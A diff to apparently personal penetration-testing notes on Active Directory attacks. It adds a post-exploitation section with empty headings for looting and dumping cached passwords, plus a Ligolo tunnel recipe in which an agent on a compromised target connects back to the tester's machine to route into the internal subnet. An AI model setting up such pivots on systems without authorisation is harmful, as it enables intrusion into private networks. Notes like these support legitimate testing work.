@@ -1,5 +1,24 @@
 # Active Directory Enumeration & Exploitation
 
+## Local Post-Exploitation
+
+### Complete machine loot finding
+
+### Dump cached pwds and logonpwds
+
+### Ligolo tunnel
+```bash
+Upload agent to target
+Initialize proxy locally
+1. sudo ip tuntap add user ratty mode tun ligolo
+2. sudo ip link set ligolo up
+3. ./proxy -selfcert
+4. .\agent -connect <myip>:11601 -ignore-cert
+(In ligolo interface) session >> 1
+// Check if internal network route is added $ ifconfig
+$ start
+(on debian) sudo ip route add <internalsubnet>/24 dev ligolo
+```
 ## Intial Domain Enum
 
 ### Initialize env vars
@@ -31,7 +50,7 @@ cd ~/bloodhound
 ./bloodhound-cli resetpwd
 ```
 
-## Targeted Enum
+## Targeted enum
 
 ### Get pwned user outbound object control
 ```bash
